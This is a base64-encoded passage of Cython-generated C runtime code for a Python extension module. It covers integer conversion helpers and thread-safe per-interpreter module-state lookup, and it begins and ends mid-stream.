bHQ7XG4gICAgfVxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJfX2ludF9fIHJldHVybmVkIG5vbi1pbnQgKHR5cGUgIiBfX1B5eF9GTVRfVFlQRU5BTUUgIikiLFxuICAgICAgICAgICAgICAgICByZXN1bHRfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZyhQeU9iamVjdCogeCkge1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICBQeU51bWJlck1ldGhvZHMgKm07XG4jZW5kaWZcbiAgUHlPYmplY3QgKnJlcyA9IE5VTEw7XG4gIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrKHgpKSlcbiAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoeCk7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gIG0gPSBQeV9UWVBFKHgpLT50cF9hc19udW1iZXI7XG4gIGlmIChsaWtlbHkobSAmJiBtLT5uYl9pbnQpKSB7XG4gICAgICByZXMgPSBtLT5uYl9pbnQoeCk7XG4gIH1cbiNlbHNlXG4gIGlmICghUHlCeXRlc19DaGVja0V4YWN0KHgpICYmICFQeVVuaWNvZGVfQ2hlY2tFeGFjdCh4KSkge1xuICAgICAgcmVzID0gUHlOdW1iZXJfTG9uZyh4KTtcbiAgfVxuI2VuZGlmXG4gIGlmIChsaWtlbHkocmVzKSkge1xuICAgICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2tFeGFjdChyZXMpKSkge1xuICAgICAgICAgIHJldHVybiBfX1B5eF9QeU51bWJlcl9Mb25nV3JvbmdSZXN1bHRUeXBlKHJlcyk7XG4gICAgICB9XG4gIH1cbiAgZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgImFuIGludGVnZXIgaXMgcmVxdWlyZWQiKTtcbiAgfVxuICByZXR1cm4gcmVzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCogYikge1xuICBQeV9zc2l6ZV90IGl2YWw7XG4gIFB5T2JqZWN0ICp4O1xuICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KGIpKSkge1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoYikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKGIpO1xuICAgIH0gZWxzZSB7XG4gICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhiKTtcbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KGIpO1xuICAgICAgc3dpdGNoIChzaXplKSB7XG4gICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgfVxuICAgICAgICAgICBicmVhaztcbiAgICAgICAgIGNhc2UgLTI6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgfVxuICAgICAgICAgICBicmVhaztcbiAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoKChzaXplX3QpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoKChzaXplX3QpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHJldHVybiBQeUxvbmdfQXNTc2l6ZV90KGIpO1xuICB9XG4gIHggPSBQeU51bWJlcl9JbmRleChiKTtcbiAgaWYgKCF4KSByZXR1cm4gLTE7XG4gIGl2YWwgPSBQeUxvbmdfQXNTc2l6ZV90KHgpO1xuICBQeV9ERUNSRUYoeCk7XG4gIHJldHVybiBpdmFsO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqIG8pIHtcbiAgaWYgKHNpemVvZihQeV9oYXNoX3QpID09IHNpemVvZihQeV9zc2l6ZV90KSkge1xuICAgIHJldHVybiAoUHlfaGFzaF90KSBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChvKTtcbiAgfSBlbHNlIHtcbiAgICBQeV9zc2l6ZV90IGl2YWw7XG4gICAgUHlPYmplY3QgKng7XG4gICAgeCA9IFB5TnVtYmVyX0luZGV4KG8pO1xuICAgIGlmICgheCkgcmV0dXJuIC0xO1xuICAgIGl2YWwgPSBQeUxvbmdfQXNMb25nKHgpO1xuICAgIFB5X0RFQ1JFRih4KTtcbiAgICByZXR1cm4gaXZhbDtcbiAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihiKTtcbiAgICByZXR1cm4gX19QeXhfTmV3UmVmKFB5X05vbmUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKSB7XG4gIHJldHVybiBfX1B5eF9OZXdSZWYoYiA/IFB5X1RydWU6IFB5X0ZhbHNlKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlMb25nX0Zyb21TaXplX3Qoc2l6ZV90IGl2YWwpIHtcbiAgICByZXR1cm4gUHlMb25nX0Zyb21TaXplX3QoaXZhbCk7XG59XG5cblxuXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4jaWZuZGVmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4jaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMClcbiAgI2RlZmluZSBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAxXG4jZWxzZVxuICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDBcbiNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgJiYgIUNZVEhPTl9BVE9NSUNTXG4jZXJyb3IgIk1vZHVsZSBzdGF0ZSB3aXRoIFBFUDQ4OSByZXF1aXJlcyBhdG9taWNzLiBDdXJyZW50bHkgdGhhdFwncyBvbmUgb2ZcXFxuIEMxMSwgQysrMTEsIGdjYyBhdG9taWMgaW50cmluc2ljcyBvciBNU1ZDIGF0b21pYyBpbnRyaW5zaWNzIlxuI2VuZGlmXG4jaWYgIUNZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKVxuI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuc3RhdGljIFB5TXV0ZXggX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSB7MH07XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBQeU11dGV4X0xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBQeU11dGV4X1VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiBfX2NwbHVzcGx1cyA+PSAyMDExMDNMXG4jaW5jbHVkZSA8bXV0ZXg+XG5zdGF0aWMgc3RkOjptdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4LmxvY2soKVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC51bmxvY2soKVxuI2VsaWYgZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJiAoX19TVERDX1ZFUlNJT05fXyA+IDIwMTExMkwpICYmICFkZWZpbmVkKF9fU1REQ19OT19USFJFQURTX18pXG4jaW5jbHVkZSA8dGhyZWFkcy5oPlxuc3RhdGljIG10eF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4O1xuc3RhdGljIG9uY2VfZmxhZyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcgPSBPTkNFX0ZMQUdfSU5JVDtcbnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgodm9pZCkge1xuICAgIG10eF9pbml0KCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCwgbXR4X3BsYWluKTtcbn1cbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpXFxcbiAgY2FsbF9vbmNlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcsIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgpO1xcXG4gIG10eF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgbXR4X3VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxpZiBkZWZpbmVkKEhBVkVfUFRIUkVBRF9IKVxuI2luY2x1ZGUgPHB0aHJlYWQuaD5cbnN0YXRpYyBwdGhyZWFkX211dGV4X3QgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBQVEhSRUFEX01VVEVYX0lOSVRJQUxJWkVSO1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgcHRocmVhZF9tdXRleF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgcHRocmVhZF9tdXRleF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChfV0lOMzIpXG4jaW5jbHVkZSA8V2luZG93cy5oPiAgLy8gc3luY2hhcGkuaCBvbiBpdHMgb3duIGRvZXNuXCd0IHdvcmtcbnN0YXRpYyBTUldMT0NLIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gU1JXTE9DS19JTklUO1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgQWNxdWlyZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBSZWxlYXNlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxzZVxuI2Vycm9yICJObyBzdWl0YWJsZSBsb2NrIGF2YWlsYWJsZSBmb3IgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUuXFxcbiBSZXF1aXJlcyBDIHN0YW5kYXJkID49IEMxMSwgb3IgQysrIHN0YW5kYXJkID49IEMrKzExLFxcXG4gb3IgcHRocmVhZHMsIG9yIHRoZSBXaW5kb3dzIDMyIEFQSSwgb3IgUHl0aG9uID49IDMuMTMuIlxuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgaW50NjRfdCBpZDtcbiAgICBQeU9iamVjdCAqbW9kdWxlO1xufSBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlO1xudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIGNoYXIgaW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXg7XG4gICAgUHlfc3NpemVfdCBjb3VudDtcbiAgICBQeV9zc2l6ZV90IGFsbG9jYXRlZDtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlIHRhYmxlWzFdO1xufSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGE7XG4jZGVmaW5lIF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSAzMlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG5zdGF0aWMgX19weXhfYXRvbWljX2ludF90eXBlIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlciA9IDA7XG4jZW5kaWZcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIF9fcHl4X2F0b21pY19wdHJfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gMDtcbiNlbHNlXG5zdGF0aWMgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gTlVMTDtcbiNlbmRpZlxuc3RhdGljIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogdGFibGUsXG4gICAgICAgIFB5X3NzaXplX3QgY291bnQsXG4gICAgICAgIGludDY0X3QgaW50ZXJwcmV0ZXJJZCkge1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGJlZ2luID0gdGFibGU7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogZW5kID0gYmVnaW4gKyBjb3VudDtcbiAgICBpZiAoYmVnaW4tPmlkID09IGludGVycHJldGVySWQpIHtcbiAgICAgICAgcmV0dXJuIGJlZ2luO1xuICAgIH1cbiAgICB3aGlsZSAoKGVuZCAtIGJlZ2luKSA+IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkge1xuICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBoYWxmd2F5ID0gYmVnaW4gKyAoZW5kIC0gYmVnaW4pLzI7XG4gICAgICAgIGlmIChoYWxmd2F5LT5pZCA9PSBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgICAgICByZXR1cm4gaGFsZndheTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoaGFsZndheS0+aWQgPCBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgICAgICBiZWdpbiA9IGhhbGZ3YXk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBlbmQgPSBoYWxmd2F5O1xuICAgICAgICB9XG4gICAgfVxuICAgIGZvciAoOyBiZWdpbiA8IGVuZDsgKytiZWdpbikge1xuICAgICAgICBpZiAoYmVnaW4tPmlkID49IGludGVycHJldGVySWQpIHJldHVybiBiZWdpbjtcbiAgICB9XG4gICAgcmV0dXJuIGJlZ2luO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHtcbiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7XG4gICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gTlVMTDtcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAge1xuICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpO1xuICAgICAgICBpZiAobGlrZWx5KGRhdGEpKSB7XG4gICAgICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkoZGF0YSA9PSBuZXdfZGF0YSkpIHtcbiAgICAgICAgICAgICAgICBnb3RvIHJlYWRfZmluaXNoZWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpO1xuICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpO1xuICAgICAgICBkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgfVxuICByZWFkX2ZpbmlzaGVkOjtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTtcbiNlbmRpZlxuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGZvdW5kID0gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoIWRhdGEpKSBnb3RvIGVuZDtcbiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHtcbiAgICAgICAgICAgIGZvdW5kID0gZGF0YS0+dGFibGUraW50ZXJwcmV0ZXJfaWQ7XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBmb3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgICAgIGRhdGEtPnRhYmxlLCBkYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpO1xuICAgIH1cbiAgZW5kOlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdD1OVUxMO1xuICAgICAgICBpZiAoZm91bmQgJiYgZm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBmb3VuZC0+bW9kdWxlO1xuICAgICAgICB9XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiNlbmRpZlxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbn1cbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIHZvaWQgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKHZvaWQpIHtcbiAgICB3aGlsZSAoX19weXhfYXRvbWljX2xvYWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcikgIT0gMCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKipvbGRfZGF0YSwgUHlPYmplY3QqIG1vZHVsZSwgaW50NjRfdCBpbnRlcnByZXRlcl9pZCkge1xuICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkO1xuICAgIHdoaWxlICh0b19hbGxvY2F0ZSA8PSBpbnRlcnByZXRlcl9pZCkge1xuICAgICAgICBpZiAodG9fYWxsb2NhdGUgPT0gMCkgdG9fYWxsb2NhdGUgPSAxO1xuICAgICAgICBlbHNlIHRvX2FsbG9jYXRlICo9IDI7XG4gICAgfVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSAqb2xkX2RhdGE7XG4gICAgaWYgKHRvX2FsbG9jYXRlICE9ICgqb2xkX2RhdGEpLT5hbGxvY2F0ZWQpIHtcbiAgICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKXJlYWxsb2MoXG4gICAgICAgICAgICAqb2xkX2RhdGEsXG4gICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSsodG9fYWxsb2NhdGUtMSkqc2l6ZW9mKF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUpKTtcbiAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IG5ld19kYXRhLT5hbGxvY2F0ZWQ7IGkgPCB0b19hbGxvY2F0ZTsgKytpKSB7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBpO1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlO1xuICAgIH1cbiAgICBuZXdfZGF0YS0+dGFibGVbaW50ZXJwcmV0ZXJfaWRdLm1vZHVsZSA9IG1vZHVsZTtcbiAgICBpZiAobmV3X2RhdGEtPmNvdW50IDwgaW50ZXJwcmV0ZXJfaWQrMSkge1xuICAgICAgICBuZXdfZGF0YS0+Y291bnQgPSBpbnRlcnByZXRlcl9pZCsxO1xuICAgIH1cbiAgICAqb2xkX2RhdGEgPSBuZXdfZGF0YTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSkge1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKnJlYWQgPSBkYXRhLT50YWJsZTtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICp3cml0ZSA9IGRhdGEtPnRhYmxlO1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IHJlYWQgKyBkYXRhLT5jb3VudDtcbiAgICBmb3IgKDsgcmVhZDxlbmQ7ICsrcmVhZCkge1xuICAgICAgICBpZiAocmVhZC0+bW9kdWxlKSB7XG4gICAgICAgICAgICB3cml0ZS0+aWQgPSByZWFkLT5pZDtcbiAgICAgICAgICAgIHdyaXRlLT5tb2R1bGUgPSByZWFkLT5tb2R1bGU7XG4gICAgICAgICAgICArK3dyaXRlO1xuICAgICAgICB9XG4gICAgfVxuICAgIGRhdGEtPmNvdW50ID0gd3JpdGUgLSBkYXRhLT50YWJsZTtcbiAgICBmb3IgKDsgd3JpdGU8ZW5kOyArK3dyaXRlKSB7XG4gICAgICAgIHdyaXRlLT5pZCA9IDA7XG4gICAgICAgIHdyaXRlLT5tb2R1bGUgPSBOVUxMO1xuICAgIH1cbiAgICBkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZShQeU9iamVjdCogbW9kdWxlLCBDWVRIT05f